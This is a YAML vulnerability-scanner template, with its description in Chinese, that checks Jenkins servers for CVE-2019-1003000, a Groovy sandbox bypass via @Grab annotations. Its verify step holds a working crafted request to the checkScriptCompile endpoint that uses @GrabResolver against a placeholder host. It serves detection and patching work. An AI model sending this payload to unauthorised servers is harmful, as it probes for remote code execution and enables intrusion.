app: Jenkins
query: app:"Jenkins"
meta:
  name: CVE-2019-1003000 Jenkins远程代码执行
  level: 4
  tags:
    - remote_code_execution
  description: 该漏洞存在于Declarative Plugin 1.3.4.1之前的版本, Groovy Plugin 2.61.1之前的版本以及Script Security Plugin 1.50之前的版本。该漏洞通过将AST转换注释（如@Grab）应用于源代码元素，可以在脚本编译阶段避免脚本安全沙箱保护。所以会造成具有“Overall/Read”权限的用户或能够控制SCM中的Jenkinsfile或者sandboxed Pipeline共享库内容的用户可以绕过沙盒保护并在Jenkins主服务器上执行任意代码。
  homepage: https://www.jenkins.io/
  author: 一曲成殇
  references: https://www.freebuf.com/news/242764.html
  solution: 升级软件版本
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: GET
            path: /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27vtest%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vtestvul%27,%20version=%271%27)%0aimport%20Vtest;
            redirect: false
            header: [ ]
            params: ""
          response:
            - name: body
              value: package#vtestvul
              type: contains
  create_at: "2022-04-27 14:41:24"
